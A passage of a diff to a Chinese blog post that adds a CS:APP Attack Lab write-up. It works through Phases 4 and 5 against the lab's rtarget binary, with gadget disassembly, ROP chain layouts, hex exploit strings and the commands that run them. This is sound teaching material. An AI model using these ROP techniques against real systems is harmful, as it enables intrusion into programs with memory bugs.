class="line"></span><br><span class="line">0000000000000035 &lt;setval_424&gt;:</span><br><span class="line">  35:	f3 0f 1e fa          	endbr64 </span><br><span class="line">  39:	c7 07 54 c2 58 92    	movl   $0x9258c254,(%rdi)</span><br><span class="line">  3f:	c3                   	retq   </span><br><span class="line"></span><br><span class="line">0000000000000040 &lt;setval_470&gt;:</span><br><span class="line">  40:	f3 0f 1e fa          	endbr64 </span><br><span class="line">  44:	c7 07 63 48 8d c7    	movl   $0xc78d4863,(%rdi)</span><br><span class="line">  4a:	c3                   	retq   </span><br><span class="line"></span><br><span class="line">000000000000004b &lt;setval_426&gt;:</span><br><span class="line">  4b:	f3 0f 1e fa          	endbr64 </span><br><span class="line">  4f:	c7 07 48 89 c7 90    	movl   $0x90c78948,(%rdi)</span><br><span class="line">  55:	c3                   	retq   </span><br><span class="line"></span><br><span class="line">0000000000000056 &lt;getval_280&gt;:</span><br><span class="line">  56:	f3 0f 1e fa          	endbr64 </span><br><span class="line">  5a:	b8 29 58 90 c3       	mov    $0xc3905829,%eax</span><br><span class="line">  5f:	c3                   	retq   </span><br><span class="line"></span><br><span class="line">0000000000000060 &lt;mid_farm&gt;:</span><br><span class="line">  60:	f3 0f 1e fa          	endbr64 </span><br><span class="line">  64:	b8 01 00 00 00       	mov    $0x1,%eax</span><br><span class="line">  69:	c3                   	retq  </span><br></pre></td></tr></table></figure>
+
+<p>有意识的搜索%rdi这个寄存器相关的机器指令<code>48 89 c7</code>,搜索和%rax有关的<code>58</code>,便注意到这两个函数,<addval_273>和<addval_219>,在rtarget的反汇编中把他找出来(这样能找到地址)</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">00000000004019a0 &lt;addval_273&gt;:</span><br><span class="line">  4019a0:	8d 87 48 89 c7 c3    	lea    -0x3c3876b8(%rdi),%eax</span><br><span class="line">  4019a6:	c3                   	retq   </span><br><span class="line"></span><br><span class="line">00000000004019a7 &lt;addval_219&gt;:</span><br><span class="line">  4019a7:	8d 87 51 73 58 90    	lea    -0x6fa78caf(%rdi),%eax</span><br><span class="line">  4019ad:	c3                   	retq   </span><br></pre></td></tr></table></figure>
+
+<p>当273&gt;函数从0x004019a2开始时,会执行<code>mov %rax,%rdi</code>,<code>ret</code></p>
+<p>当219&gt;函数从0x004019ab开始时,会执行<code>pop %rax</code>,<code>ret</code>.</p>
+<p>这样我们不就可以组合出我们的代码了吗,通过一个一个ret来吧不同的gadget连接在一起</p>
+<p>答案框架如下,</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">---栈底---</span><br><span class="line">0x4017ec    &lt;---touch2地址</span><br><span class="line">0x4019a2    &lt;--gadget2</span><br><span class="line">cookie            #0x59b997fa   &lt;----%rsp</span><br><span class="line"> 0x4019ab     &lt;---gadget1</span><br><span class="line">---栈顶---</span><br></pre></td></tr></table></figure>
+
+<p>编写答案 sol4.txt(注意小端法)</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">ab 19 40 00 00 00 00 00</span><br><span class="line">fa 97 b9 59 00 00 00 00</span><br><span class="line">a2 19 40 00  00 00 00 00</span><br><span class="line">ec 17 40 00 00 00 00 00</span><br></pre></td></tr></table></figure>
+
+<p>输入命令</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./hex2raw &lt;sol4.txt &gt;sol4r.txt &amp;&amp; ./rtarget -q -i sol4r.txt</span><br></pre></td></tr></table></figure>
+
+<p>注意是要运行rtarget!!!,不要搞错了兄弟们!!!</p>
+<p>若出现以下界面则为成功通关</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202403020220002.png" alt="image-20240302021056405"></p>
+<h2 id="Phase-5"><a href="#Phase-5" class="headerlink" title="Phase_5"></a>Phase_5</h2><blockquote>
+<p>坚持就是胜利!</p>
+</blockquote>
+<p><img src="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202402292127944.png" alt="image-20240229212126798"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202402292127952.png" alt="image-20240229212144522"></p>
+<img src="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202403020220043.png" alt="image-20240301232923919" style="zoom:200%;" />
+
+<p>我们要通过ROP实现touch3的功能,touch3在phase_3的实现如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">push $0x004018fa</span><br><span class="line">lea 0x8(%rsp),%rdi</span><br><span class="line">retq</span><br></pre></td></tr></table></figure>
+
+<p>操作顺序如下:</p>
+<ul>
+<li>把touch3的地址压入栈中</li>
+<li>把cookie的字符串指针地址存入到%rdi寄存器中</li>
+</ul>
+ <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">35 39 62 39 39 37 66 61 00 # 00 是字符串末尾结束的\0</span><br></pre></td></tr></table></figure>
+
+<p>地址怎么找?</p>
+<p>这是要重点解决的问题.因为开启了栈的随机化,无法定位字符串精确位置但我们可以通过栈顶的地址+相对地址得到字符串的地址</p>
+<p>如何把准确的地址传送到%rdi寄存器中呢?当然是提前计算好偏移量,然后用一个寄存器承载这个偏移量,再一点一点的把他搬运到%rdi当中啦</p>
+<p>下面是寻找一条完整的通路的全过程(已经将函数从farm中的形式换为了rtarget中的形式,使得地址一目了然),在这里面”—&gt;”表示我倒序寻找通路时思维的前进试探,慢慢打通每一个节点,是寄存器转移顺序的反向,箭头后面表示的是Gadget的起始地址.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">0000000000401a03 &lt;addval_190&gt;:</span><br><span class="line">  401a03:	8d 87 41 48 89 e0    	lea    -0x1f76b7bf(%rdi),%eax</span><br><span class="line">  401a09:	c3                   	retq  </span><br><span class="line">  ----- %rsp--&gt;%rax----0x401a06------------</span><br><span class="line"></span><br><span class="line">00000000004019a0 &lt;addval_273&gt;:</span><br><span class="line">  4019a0:	8d 87 48 89 c7 c3    	lea    -0x3c3876b8(%rdi),%eax</span><br><span class="line">  4019a6:	c3                   	retq   </span><br><span class="line"></span><br><span class="line">  ----%rax--&gt;%rdi----0x4019a2--------</span><br><span class="line">  这样子就把%rsp的地址丢到%rdi当中了</span><br><span class="line">  执行完getbuf时%rsp= 0x5561dca8</span><br><span class="line">  字符串应该是存在栈顶+相对位置</span><br><span class="line"></span><br><span class="line">00000000004019d6 &lt;add_xy&gt;:</span><br><span class="line">  4019d6:	48 8d 04 37          	lea    (%rdi,%rsi,1),%rax</span><br><span class="line">  4019da:	c3                   	retq  </span><br><span class="line">----这个lea能把%rsi作为偏移量,计算好后再返回到%rdi中就好了---0x4019d6</span><br><span class="line"></span><br><span class="line">所以我们就要想办法往%rsi中丢值,因为找不到pop %rsi的片段,只能从其他地方入手</span><br><span class="line"></span><br><span class="line">0000000000401a11 &lt;addval_436&gt;:</span><br><span class="line">  401a11:	8d 87 89 ce 90 90    	lea    -0x6f6f3177(%rdi),%eax</span><br><span class="line">  401a17:	c3                   	retq   </span><br><span class="line">  </span><br><span class="line">  ---%ecx---&gt;%esi----0x401a13</span><br><span class="line"> -----</span><br><span class="line">  想试验下78 和c9会不会影响执行程序,不会影响,照样能运行</span><br><span class="line">00000000004019e8 &lt;addval_113&gt;:</span><br><span class="line">  4019e8:	8d 87 89 ce 78 c9    	lea    -0x36873177(%rdi),%eax</span><br><span class="line">  4019ee:	c3                   	retq </span><br><span class="line">-----0x4019ea------</span><br><span class="line"></span><br><span class="line">一步步往前找,每找到一个就看一下能不能通过pop得到该值</span><br><span class="line"></span><br><span class="line">0000000000401a68 &lt;getval_311&gt;:</span><br><span class="line">  401a68:	b8 89 d1 08 db       	mov    $0xdb08d189,%eax</span><br><span class="line">  401a6d:	c3                   	retq   </span><br><span class="line"></span><br><span class="line">---%edx---&gt;%ecx---0x401a69----</span><br><span class="line"></span><br><span class="line">00000000004019db &lt;getval_481&gt;:</span><br><span class="line">  4019db:	b8 5c 89 c2 90       	mov    $0x90c2895c,%eax</span><br><span class="line">  4019e0:	c3                   	retq  </span><br><span class="line"></span><br><span class="line">  ---%edx---&gt;%eax---0x4019dd---</span><br><span class="line">  </span><br><span class="line">00000000004019ca &lt;getval_280&gt;:</span><br><span class="line">  4019ca:	b8 29 58 90 c3       	mov    $0xc3905829,%eax</span><br><span class="line">  4019cf:	c3                   	retq  </span><br><span class="line">  ----pop %rax---0x4019cc----</span><br><span class="line">  </span><br><span class="line">找到了一条通路,所以我们就可以通过pop %rax的值来吧那个偏移量送到%rsi中,最后再把%rdi给更新了</span><br><span class="line">就能够定位字符串的位置了</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>接下来我们找到每个gadget的location,记得加上一点偏移量来定位到对应的Gadgets开头,然后我们就可以编写答案框架了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">----栈顶----</span><br><span class="line">buf缓冲区,要填0x28个字符</span><br><span class="line">movq %rsp--&gt;%rax            &lt;----gadget1    0x401a06   &lt;----%rsp</span><br><span class="line">movq %rax---&gt;%rdi           &lt;----gadget2    0x4019a2</span><br><span class="line">pop %rax		           &lt;----gadget3     0x4019cc</span><br><span class="line">相对偏移量  0x48</span><br><span class="line">movl %eax---&gt;%edx          &lt;---gadget4      0x4019dd</span><br><span class="line">movl %edx---&gt;%ecx          &lt;---gadget5      0x401a69</span><br><span class="line">movl %ecx----&gt;%esi	      &lt;---gadget6	0x401a13</span><br><span class="line">lea (%rdi,%rsi,1),%rax	     &lt;---gadget7      0x4019d6</span><br><span class="line">movl %rax---&gt;%rdi            &lt;----gadget8      0x4019a2</span><br><span class="line">$touch3                                &lt;---gadget9        0x004018fa</span><br><span class="line">cookie 			             &lt;---gadget10       35 39 62 39 39 37 66 61</span><br><span class="line">---栈底---</span><br></pre></td></tr></table></figure>
+
+
+
+<p>编写sol5.txt文档</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">06 1a 40 00 00 00 00 00</span><br><span class="line">a2 19 40 00 00 00 00 00</span><br><span class="line">cc 19 40 00 00 00 00 00</span><br><span class="line">48 00 00 00 00 00 00 00</span><br><span class="line">dd 19 40 00 00 00 00 00</span><br><span class="line">69 1a 40 00 00 00 00 00</span><br><span class="line">13 1a 40 00 00 00 00 00</span><br><span class="line">d6 19 40 00 00 00 00 00</span><br><span class="line">a2 19 40 00 00 00 00 00</span><br><span class="line">fa 18 40  00 00 00 00 00</span><br><span class="line">35 39 62 39 39 37 66 61</span><br></pre></td></tr></table></figure>
+
+<p>输入命令</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./hex2raw &lt;sol5.txt &gt;sol5r.txt &amp;&amp; ./rtarget -q -i sol5r.txt</span><br></pre></td></tr></table></figure>
+
+
+
+<p>提交一手,完美通关!!!</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202403020220099.png" alt="image-20240302010809099"></p>
+<p>至此,圆满完成通关!</p>
+<h1 id="小记"><a href="#小记" class="headerlink" title="小记"></a>小记</h1><p>这篇详解是我在第一次做时边做边写的,做完phase_5后又兴致大发开始梳理编写,现在是3月2日的凌晨2:16分,大脑又困又转动.</p>
+<p>实话实说,做这个真的很有意思,虽然我看了不少人的答案,毕竟一开始真的不能理解,不过现在大都理解了,这是一共的文件数量,做完整个lab.</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202403020220164.png" alt="image-20240302021849311"></p>
+<p>希望下一次能够独立做出lab!这才是更大的进步!</p>
+<blockquote>
+<p>Good Luck:生命不止,奋斗不息</p>
+</blockquote>
 
     </div>
 
@@ -513,7 +646,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Part-I-CI"><span class="nav-number">1.</span> <span class="nav-text">Part I CI</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%80%BB%E8%A7%88"><span class="nav-number">1.1.</span> <span class="nav-text">总览</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Phase-1"><span class="nav-number">1.2.</span> <span class="nav-text">Phase_1</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Phase-2"><span class="nav-number">1.3.</span> <span class="nav-text">Phase_2</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Phase-3"><span class="nav-number">1.4.</span> <span class="nav-text">Phase_3</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Part-II-ROP"><span class="nav-number">2.</span> <span class="nav-text">Part II: ROP</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%80%BB%E8%A7%88-1"><span class="nav-number">2.1.</span> <span class="nav-text">总览</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Phase-4"><span class="nav-number">2.2.</span> <span class="nav-text">Phase_4</span></a></li></ol></li></ol></div>
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Part-I-CI"><span class="nav-number">1.</span> <span class="nav-text">Part I CI</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%80%BB%E8%A7%88"><span class="nav-number">1.1.</span> <span class="nav-text">总览</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Phase-1"><span class="nav-number">1.2.</span> <span class="nav-text">Phase_1</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Phase-2"><span class="nav-number">1.3.</span> <span class="nav-text">Phase_2</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Phase-3"><span class="nav-number">1.4.</span> <span class="nav-text">Phase_3</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Part-II-ROP"><span class="nav-number">2.</span> <span class="nav-text">Part II: ROP</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%80%BB%E8%A7%88-1"><span class="nav-number">2.1.</span> <span class="nav-text">总览</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Phase-4"><span class="nav-number">2.2.</span> <span class="nav-text">Phase_4</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Phase-5"><span class="nav-number">2.3.</span> <span class="nav-text">Phase_5</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%B0%8F%E8%AE%B0"><span class="nav-number">3.</span> <span class="nav-text">小记</span></a></li></ol></div>
       </div>
       <!--/noindex-->
 
@@ -582,12 +715,12 @@
     <span class="post-meta-item-icon">
       <i class="fa fa-chart-area"></i>
     </span>
-    <span title="站点总字数">254k</span>
+    <span title="站点总字数">261k</span>
     <span class="post-meta-divider">|</span>
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
-    <span title="站点阅读时长">7:41</span>
+    <span title="站点阅读时长">7:55</span>
 </div>
 <!-- 网站运行时间的设置 -->
 <span id="timeDate">载入天数...</span>
